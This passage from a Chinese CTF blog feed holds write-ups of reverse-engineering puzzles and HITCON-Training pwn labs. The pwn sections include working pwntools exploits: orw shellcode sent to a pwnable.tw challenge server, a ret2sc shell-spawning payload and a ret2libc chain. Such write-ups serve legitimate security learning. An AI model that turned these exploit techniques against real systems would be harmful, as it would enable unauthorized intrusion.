alt="9"><br>解出来答案是flag{1c15908d00762edf4a0dd7ebbabe68bb}</p><h2 id="设备固件逆向"><a href="#设备固件逆向" class="headerlink" title="设备固件逆向"></a>设备固件逆向</h2><p>‘’’<br>这题还没弄完。。。。大致可以知道怎么弄了<br>主要是qemu<br>装不上啊<br>qemu-mips用不了。。。。<br>题目给了一个ext4的文件，直接挂载后把hello提取出来<br>放进ida静态分析是可以了<br>因为不怎么了解mips<br>必须要结合调试才能写‘猜’出这题<br>没办法只好先放着了<br>‘’’<br>动态调试硬是没有弄成<br>先来一波静态分析吧<br>顺便熟悉一波retdec</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON-Training</title>
    <link href="/2019/05/23/HITCON-Training/"/>
    <url>/2019/05/23/HITCON-Training/</url>
    
    <content type="html"><![CDATA[<p>最近观摩了v爷爷的blog。。。<br>外加人人人催促学pwn时提到了这玩意。。。<br>没办法，开始一波学习。<br>题目比较基础，适合我这种萌新入门。<br>之前因为太着急了一直在看堆。。。前面基础没有打扎实，现在重新复习一下下。</p><a id="more"></a><h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><p>就是个re嘛<br><img src="2.png" alt="2"><br>让你熟悉调试器的<br>脚本直接解</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">a = [<span class="hljs-number">0x07</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x55</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x5B</span>,<br>  <span class="hljs-number">0x31</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x42</span>]<br>b = <span class="hljs-string">&#x27;Do_you_know_why_my_teammate_Orange_is_so_angry???&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in range(len(b)):</span><br><span class="hljs-string">    flag += chr(ord(b[i])^a[i])</span><br><span class="hljs-string">print flag</span><br></code></pre></td></tr></table></figure><h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><p>orw<br><img src="3.png" alt="3"><br>pwnable.tw原题<br>orw_seccomp()是个类似白名单的东西<br>他限制了sys的使用<br>但是没关系，我们的目的是flag<br>用orw读就行了<br>一开始以为要自写汇编。。。但是自身汇编功底没那么猛。。。有点懵逼，后来发现shellcraft已经集成好了这玩意</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import  *<br><br><span class="hljs-attribute">p</span> = remote(&#x27;chall.pwnable.tw&#x27;,<span class="hljs-number">10001</span>)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;:&#x27;)<br><span class="hljs-attribute">shellcode</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">shellcode</span> += shellcraft.i<span class="hljs-number">386</span>.pushstr(<span class="hljs-string">&quot;/home/orw/flag&quot;</span>)<br><span class="hljs-attribute">shellcode</span> += shellcraft.i<span class="hljs-number">386</span>.linux.syscall(<span class="hljs-string">&quot;SYS_open&quot;</span>, &#x27;esp&#x27;)<br><span class="hljs-attribute">shellcode</span> += shellcraft.i<span class="hljs-number">386</span>.linux.syscall(<span class="hljs-string">&quot;SYS_read&quot;</span>, &#x27;eax&#x27;, &#x27;esp&#x27;, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>)<br><span class="hljs-attribute">shellcode</span> += shellcraft.i<span class="hljs-number">386</span>.linux.syscall(<span class="hljs-string">&quot;SYS_write&quot;</span>, <span class="hljs-number">1</span>, &#x27;esp&#x27;, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>)<br><span class="hljs-attribute">p</span>.send(asm(shellcode))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h2><p>ret2sc第一次在name处注入sc<br>然后gets溢出过去。<br>反编译后显示的溢出偏移位是不对的<br>一般出现这种情况都是因为程序优化，通过esp来寻址<br>看了下反汇编，果不其然。。。<br><img src="1.png" alt="1"><br>调试即可获得偏移位</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span> =<span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./ret2sc&quot;</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>sc = asm(shellcraft.sh())<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(sc)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span> + p32(<span class="hljs-number">0x0804A060</span>)<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h2><p>ret2libc<br>不知道为什么每次遇到ret2libc 我的18.04总是打不下来<br>只好用16.04了。。。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">from</span> pwn import *<br>a = process(<span class="hljs-string">&quot;./ret2lib&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;ret2lib&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]))<br><span class="hljs-built_in">str</span> = a.recv()<br><span class="hljs-built_in">real</span> = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>[<span class="hljs-number">31</span>:<span class="hljs-number">39</span>],<span class="hljs-number">16</span>)<br><span class="hljs-keyword">print</span> <span class="hljs-built_in">real</span><br><span class="hljs-meta">#a.recvuntil(&quot;Leave some message for me :&quot;)</span><br>sys = <span class="hljs-built_in">real</span> - lib.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh = <span class="hljs-built_in">real</span> - lib.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] + lib.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-keyword">next</span>()<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(sys) + p32(sh) + p32(sh)<br>a.send(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>未完待续</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>金陵某道re</title>
    <link href="/2019/05/22/%E9%87%91%E9%99%B5%E6%9F%90%E9%81%93re/"/>
    <url>/2019/05/22/%E9%87%91%E9%99%B5%E6%9F%90%E9%81%93re/</url>
    
    <content type="html"><![CDATA[<p>题目不难就是长<br>第一次见到培根密码的逆向<br>算是长见识了</p><a id="more"></a><p>aspack不多说了<br>直接讲主要算法吧<br>这题分了3小问，算法涉及的挺多<br>但都是基础</p><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>首先是个maze啊<br>maze简单可以直接秒<br><img src="1.png" alt="1"><br>wasd玩过游戏的都知道是上下左右<br>每行有30个//看v6的变化<br>通过v6和v2也可以看出来初始位置在第二行第二个<br>判定的话就是只能走2，0可以理解为墙，要走到6<br>吧地图dump一下吧<br><img src="2.png" alt="2"><br>标记了一下2和6<br>最短路径很明显啊</p><p>ddssassssssssddssssssddddsdddddddddddd</p><h2 id="rootname"><a href="#rootname" class="headerlink" title="rootname"></a>rootname</h2><p>中间还有一个pwd就是个xor<br>pwd是123456789这边不写了，与最终的flag也无关<br>rootname和whoyouare的验证其实挺吓人的。。。<br><img src="3.png" alt="3"><br>我是直接对着反汇编怼的，看反编译有点头疼。<br>//毕竟当时是在怼完kanxue那题的情况下看的，脑子已经晕呼呼了=。=<br><img src="4.png" alt="4"><br>首先是个复制<br>然后一个循环操作又是取模又是除的想都不用想就知道了<br>明显一个进制转换直接在下面下断点跳<br>在内存中也能看到<br><img src="5.png" alt="5"><br>b16//本质上就是字符串转16进制<br>玩过今年西湖论剑的都可以发现这算法和里面出现的b58一个样<br>紧接着又可以看到一个复制操作。。。<br>然后就是栅栏了<br><img src="6.png" alt="6"><br>当时写的时候也没想到是栅栏<br>我是直接改内存后看回显的置换表来解的<br>当然现在想想肯定是写烦了。。。<br>栅栏每组字数是5，直接网上在线解一下<br>然后下面一个去码表的大循环是个b64很明显<br><img src="7.png" alt="7"><br>紧跟着的就是上面那个栅栏函数。。。<br>最后是与内存中的字符串比较<br>NTUGNDM3OUA3NTY1RDQzNjZ5<br>解的话很简单<br>先栅栏解出原来b64<br>NDA1NTM3RjU3NDZGOTQ5NUYz<br>b64解出<br>405537F5746F9495F3<br>栅栏一次<br>437950744F5F69355F<br>b16一下<br>CyPtO_i5_<br>当初的脚本因为是打出表来写的就不上了</p><h2 id="whoyouare"><a href="#whoyouare" class="headerlink" title="whoyouare"></a>whoyouare</h2><p>终于到最后的whoyouare了<br>这里就涉及到了培根密码了<br>识别也很简单<br>在b64码表下面可以看到培根的码表<br><img src="8.png" alt="8"><br>这边顺带提醒一下<br>输入的话必须是字母<br>如果输了其他什么数字啊会崩<br>当时就是卡在这以为是什么反调试或者脱壳脱崩了。。。。<br>调了好久。。。<br>程序显示一个大小写转换<br>然后是bacon<br>接着一个凯撒<br><img src="9.png" alt="9"><br>可以看到ab都被整成了GF<br>//不管你们有没有GF反正我有<br>//     233333<br>//跑题了<br>后面还有一个栅栏<br><img src="10.png" alt="10"><br>然后是比较<br>GFFFGGFGFFFGFGGFFFGGFFGFFFFFFF<br>凯撒回来<br>BAAABBABAAABABBAAABBAABAAAAAAA<br>栅栏<br>BAABAABBBAAABAAAAAAABAABABBAAA<br>解一下<br>SOEASY<br>提交的时候都要大写<br>这题有个多解问题就是不管你输入的是soeasy还是SOEASY都是对的<br>到此结束</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>这题代码量挺多的，但算法都不错，适合入门。<br>也把这题分享给了一些萌新<br>所以此篇blog写的比较详细233</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello X1cT34m</title>
    <link href="/2019/05/08/hello-x1ct34m/"/>
    <url>/2019/05/08/hello-x1ct34m/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="03211086757bb24e1f2b22d203dc897957008743229424bfdbed0098deff975c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
      <tag>X1cT34m</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>五一小结</title>
    <link href="/2019/05/04/%E4%BA%94%E4%B8%80%E5%B0%8F%E7%BB%93/"/>
    <url>/2019/05/04/%E4%BA%94%E4%B8%80%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>五一总结<br>又是一个被同龄人拉开差距的假期</p><a id="more"></a><h2 id="fango"><a href="#fango" class="headerlink" title="fango"></a>fango</h2><p>又是一个go语言<br>这道题是最近的*ctf的水题。。。<br>*ctf不适合我这种萌新。。。最简单的题目就这么恶心了<br>一开始还真没想出来<br>以为香农范诺编码啥的，还有什么数据结构还没学。。。<br>但事实上这题和什么香农编码啊数据结构啊没有太大关系<br>主要操作其实就是一个解码操作<br><img src="1.png" alt="1"><br>可以看到他符号表都没有删<br>有个fano解码的操作<br>然后再与内存中的一大串字符串比较<br>其实输入就是内存中那一大串字符串再来个fano编码了<br>再看看他的函数列表<br><img src="2.png" alt="2"><br>可以看到还有一个加密的函数<br>这个函数没有被引用到其实是出题人写好了给你的<br>具体解法呢就是输入那一串字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">If you cannot read all your books...fondle them---peer into them, let them fall open where they will, read from the first sentence that arrests the eye, set them back on the shelves with your own hands, arrange them on your own plan so that you at least know where they are. Let them be your friends; let them, at any rate, be your acquaintances.<br></code></pre></td></tr></table></figure><p>然后在call decode进去后set eip在encode处<br>然后下断点后f9直接看回显，可以看到是不可打印字符，没事，用pwntools提交一下就完事了<br>有几个注意点就是在输入字符串后他会把回车也读进去，在内存中patch一下就行<br>还有就是encode和decode操作不可以跟进去不知道为什么<br>一跟进去程序就直接跑飞了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python2<br><br>from pwn import *<br><br>a &#x3D; remote(&#39;34.92.37.22&#39;,10001)<br>b &#x3D; [0x2B, 0x60, 0xC3, 0xBE, 0xC2, 0xB7, 0xC2, 0x82, 0xC2, 0x89,   0xC3, 0x95, 0x5B, 0xC2, 0x87, 0x2A, 0x69, 0x13, 0xC2, 0x96,   0x51, 0xC3, 0xBD, 0x6F, 0x32, 0x28, 0x5A, 0xC3, 0x92, 0x74,   0xC2, 0x94, 0xC2, 0x94, 0xC2, 0x95, 0xC2, 0x96, 0xC2, 0xA4,   0xC3, 0x8A, 0xC2, 0xA3, 0xC3, 0x8E, 0xC2, 0xB3, 0x24, 0x24,   0x24, 0xC2, 0xBA, 0xC2, 0xAE, 0x46, 0x2B, 0xC2, 0xAC, 0x3C,   0xC3, 0xAB, 0x32, 0x23, 0x2A, 0xC3, 0xB0, 0xC3, 0xB3, 0xC2,   0xAC, 0xC3, 0x85, 0xC2, 0x87, 0x2C, 0xC2, 0xA3, 0x6B, 0xC2,   0xAD, 0x0F, 0xC3, 0x87, 0x5C, 0xC2, 0xA8, 0xC3, 0xB3, 0xC2,   0xAF, 0xC3, 0xA1, 0xC3, 0xB9, 0x12, 0xC3, 0x8A, 0x44, 0x72,   0xC2, 0xA6, 0xC2, 0x91, 0x66, 0x6D, 0x31, 0xC3, 0xA7, 0x51,   0x64, 0x67, 0x78, 0x75, 0x6B, 0xC2, 0x96, 0xC2, 0x91, 0x51,   0xC3, 0xA7, 0x3E, 0x13, 0xC3, 0x8E, 0x57, 0x7B, 0x47, 0xC2,   0x9D, 0x45, 0x7F, 0x29, 0x11, 0xC3, 0x95, 0xC3, 0xA1, 0xC3,   0xA7, 0x59, 0xC2, 0x8A, 0x06, 0xC2, 0x8C, 0xC2, 0x91, 0xC2,   0xB5, 0x0F, 0x3A, 0xC2, 0x8E, 0xC2, 0xBA, 0xC3, 0x8B, 0xC3,   0xAA, 0xC3, 0xA8, 0xC3, 0xBC, 0xC2, 0x8E, 0x71, 0xC3, 0xBD,   0x6F, 0x32, 0x36, 0xC3, 0xB9, 0x42, 0xC3, 0xA7, 0x49, 0xC3,   0x92, 0x22, 0x79, 0xC3, 0x89, 0xC3, 0x93, 0x54, 0x79, 0xC3,   0x96, 0x63, 0x6A, 0x1F, 0xC3, 0x96, 0xC3, 0xB3, 0x23, 0x6F,   0xC2, 0x94, 0x37, 0xC2, 0x94, 0xC3, 0xA8, 0x76, 0xC3, 0x83,   0xC3, 0x8E, 0x7C, 0x3F, 0xC2, 0xAD, 0xC3, 0xA0, 0xC2, 0x9F,   0x0C, 0xC2, 0xAA, 0x7B, 0xC3, 0x83, 0x26, 0xC2, 0xAD, 0xC3,   0xB0, 0x7E, 0x3A, 0xC3, 0xA5, 0x47, 0xC2, 0x9D, 0x7F, 0x09,   0xC3, 0xA5, 0x49, 0x44, 0xC2, 0xB0, 0xC2, 0xAF, 0x0F, 0x3A,   0xC3, 0x8C, 0x50, 0x51, 0xC3, 0xBD, 0x6F, 0x32, 0x2C, 0xC3,   0x8C, 0x2D, 0x27, 0x49, 0xC3, 0xA3, 0x2A, 0xC3, 0xB0, 0xC3,   0xB3, 0xC2, 0xAC, 0xC3, 0x88, 0xC2, 0x89, 0xC3, 0xB0, 0xC2,   0x9D, 0x7E, 0x1C, 0xC2, 0x9F, 0x29, 0x11, 0x41, 0x47, 0xC3,   0xB5, 0xC2, 0xBC, 0xC3, 0x88, 0xC2, 0x9A, 0x38, 0xC3, 0xB0,   0xC3, 0xA2, 0xC2, 0xB8, 0xC3, 0xA9, 0x15, 0xC3, 0x92, 0x50]<br>f &#x3D; &#39;&#39;<br>for i in range(len(b)):<br>    f +&#x3D; chr(b[i])<br>a.send(f)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>长见识了。。。<br>原来还有这种操作</p><h2 id="iscc-re2"><a href="#iscc-re2" class="headerlink" title="iscc re2"></a>iscc re2</h2><p>iscc就是个辣鸡比赛<br>上分全靠py<br>题目出的和什么一样<br>re1出成脑洞题<br>re2 300分就是一个明文比较<br>唯一的看点就是他是rust写的了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">a &#x3D; [0x5f,0x6a,0x75,0x73,0x74,0x5f,0x6e,0x65,0x65,0x64,0x5f,0x74,0x6f<br>     ,0x5f,0x67,0x65,0x74,0x5f,0x77,0x68,0x61,0x74,0x5f,0x69,0x73,<br>     0x5f,0x6e,0x65,0x65,0x64,0x65,0x64,0x5f,0x2e]<br>flag &#x3D; &#39;&#39;<br>for i in range(len(a)):<br>    flag +&#x3D; chr(a[i])<br>print flag<br></code></pre></td></tr></table></figure><p>写法就是直接怼汇编<br>程序把内存中一段加密好的数据解密了再与明文比较</p><h2 id="tank-game"><a href="#tank-game" class="headerlink" title="tank game"></a>tank game</h2><p>拿到题目惊了，真让我逆一个坦克大战吗？？？<br>结合棒子国网站的那个cs的逆向<br>总结一下，对于这种”大型”游戏逆向<br>直接拖进ida，一通乱找，配合第六感来找flag<br>找到奇怪的代码段直接set ip<br>比如说有很多数据还有对数据进行操作的代码段<br><img src="3.png" alt="3"><br>可以看到这边有个奇怪操作<br><img src="4.png" alt="4"><br>点进去看可以看到类似flag的东西<br><img src="5.png" alt="5"><br>当然运行完发现桌面也有了个flag</p><h2 id="tu-ctf-2016-reverse-for-the-holy-grail-350"><a href="#tu-ctf-2016-reverse-for-the-holy-grail-350" class="headerlink" title="tu-ctf-2016 reverse-for-the-holy-grail-350"></a>tu-ctf-2016 reverse-for-the-holy-grail-350</h2><p>c艹逆向<br>对于c艹的逆向，我一般都是主看函数传参<br>如果传入的参数没有与输入相关的，直接忽视<br>或者说，输入传进去，出来后没变，直接忽视<br>还有就是配合一些黑盒猜测<br>这题的加密还是有点复杂的<br><img src="6.png" alt="6"><br>整体逻辑就是输入三次<br>前俩次输入其实都没什么卵用<br>主要是和第三次输入相关<br><img src="7.png" alt="7"><br>找到和第三次输入相关的主要验证段<br>第一个操作就是明文比较<br>出题人很友善，符号表没删，可以看到firstchar<br>其实就是每三个的第一个与这个数组比较<br>下一个check<br><img src="8.png" alt="8"><br>可以看到在下一个check之前有一个整体xor操作<br>具体check是每个xor后的thirdchar的明文比较<br>解密很轻松，异或回来呗<br>secondchar的话我这边选择爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs asm">from z3 import *<br>flag &#x3D; &#39;&#39;<br>a &#x3D; [0]*18<br>dest1 &#x3D; [0x41,0x69,0x6e,0x45,0x6f,0x61]<br>dest2 &#x3D; [0x2ef,0x2c4,0x2dc,0x2c7,0x2de,0x2fc]<br>dest3 &#x3D; [0x1d7,0xc,0x244,0x25e,0x93,0x6c]<br>b &#x3D; [65, 0, 114, 105, 0, 97, 110, 0, 114, 69, 0, 114, 111, 0, 101, 97, 0, 63]<br>j &#x3D; 0<br>v7 &#x3D; [0]*18<br>for i in range(18):<br>    if i &#x3D;&#x3D; 0:<br>        v7[i] &#x3D; 666<br>        continue<br>    else:<br>        v7[i] &#x3D; v7[i-1] + v7[i-1]%5<br>for i in range(18):<br>    if 3*int(i&#x2F;3) &#x3D;&#x3D; i:<br>        a[i] &#x3D; dest1[i&#x2F;3]<br>for i in range(18):<br>    j +&#x3D; 1<br>    if j%3 &#x3D;&#x3D; 0:<br>        a[j-1] &#x3D; dest2[(j-1)&#x2F;3]^v7[j-1]<br>print a<br>for i in range(len(b)):<br>    b[i] ^&#x3D; v7[i]<br>print b<br>for j in range(6):<br>    for i in range(128):<br>        temp &#x3D; i<br>        if ((temp ^ v7[3 * j + 1]) * b[3 * j]) % b[3 * j + 2] &#x3D;&#x3D; dest3[j]:<br>            a[3 * j + 1] &#x3D; i<br>            print i<br>for i in range(len(a)):<br>    if a[i]:<br>        flag +&#x3D; chr(a[i])<br>    else:<br>        flag +&#x3D; &#39;?&#39;<br>print flag<br></code></pre></td></tr></table></figure><p>这是当初写的草稿脚本<br>不是最终脚本<br>就这样吧<br>题目不错<br>另外，明天下午就要去x1c面试了<br>祝我能加入x1ct34m<br>希望吧。。。<br>听说驴师傅出的题很难。。。<br>唉。。。慌。。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分享几道re</title>
    <link href="/2019/04/26/%E5%88%86%E4%BA%AB%E5%87%A0%E9%81%93re/"/>
    <url>/2019/04/26/%E5%88%86%E4%BA%AB%E5%87%A0%E9%81%93re/</url>
    
    <content type="html"><![CDATA[<p>这几天一直打比赛忙不过来，偶尔抽出点时间写了几题<br>先上一道最水的吧</p><a id="more"></a><h2 id="XCTF-3rd-GCTF-2017-hackme"><a href="#XCTF-3rd-GCTF-2017-hackme" class="headerlink" title="XCTF 3rd-GCTF-2017 hackme"></a>XCTF 3rd-GCTF-2017 hackme</h2><p>这道题主逻辑其实特别简单<br><img src="1.png" alt="1"><br>输入22个之判断部分，根据伪随机数来生成v9<br>然后用v9和输入的对应xor接着匹配<br>那就很简单了，下好断点记录下v9低8位的值就行<br>因为程序只验证部分就通过，所以只能解出部分。<br>但在提交的时候需要完整的flag<br>这不难，直接改了v7后记录v9<br>毕竟水题啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">a &#x3D; [0x5F, 0xF2, 0x5E, 0x8B, 0x4E, 0x0E, 0xA3, 0xAA, 0xC7, 0x93,<br>  0x81, 0x3D, 0x5F, 0x74, 0xA3, 0x09, 0x91, 0x2B, 0x49, 0x28,<br>  0x93, 0x67]<br>b &#x3D; [0x4e,0xb7,0x4e,0x42,0x9e,0x30,0x39,0x9b,0xec,0x9e,0x3f,0x35,0x6a,0x98<br>     ,0xf1,0xf6,4,0x6d,0x93,0xa9,0x2f,0x1c,0xa5,0x1a]<br>c &#x3D; [0x11,0xA,0X11,0XD,0X1,0XF,0X0,0x6,0x3,0x1,2,4,5,7,8,9,0xb,0xc,0xe,0x10,<br>     0x12,0x13,0x14,0x15]<br>flag &#x3D; [0]*22<br>for i in range(len(b)):<br>    flag[c[i]] &#x3D; a[c[i]]^b[i]<br>print flag<br>aaa &#x3D; &#39;&#39;<br>for i in range(len(flag)):<br>    if flag[i]:<br>        aaa +&#x3D; chr(flag[i])<br>    else:<br>        aaa +&#x3D; &#39;t&#39;<br>print aaa<br></code></pre></td></tr></table></figure><h2 id="CUIT-2017-re150"><a href="#CUIT-2017-re150" class="headerlink" title="CUIT-2017 re150"></a>CUIT-2017 re150</h2><p>稍微增加些难度<br>这是一道smc+花的题<br>smc的话就不能在修改处下断点，每次调试都要从头来<br>至于花。。。就不能反编译了啊//其实是因为我不怎么会去花<br>所以，不能反编译加不能下断点<br>有点小恶心<br>好在这题的加密部分不怎么难<br><img src="2.png" alt="2"><br>疯狂跟函数可以发现主要函数位置<br>加密段有花。。。没办法<br><img src="3.png" alt="3"><br>怼汇编吧。。。<br>下断点看值配合一点黑盒可以看出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">b &#x3D; [0x73, 0x8D, 0xF2, 0x4C, 0xC7, 0xD4, 0x7B, 0xF7, 0x18, 0x32,<br>  0x71, 0x0D, 0xCF, 0xDC, 0x67, 0x4F, 0x7F, 0x0B, 0x6D, 0x00]<br>a &#x3D; [49, 24, 206, 133, 87, 180, 218, 119, 49, 185,<br>  82, 39, 26, 6, 139, 205, 113, 161, 74]<br>flag &#x3D; 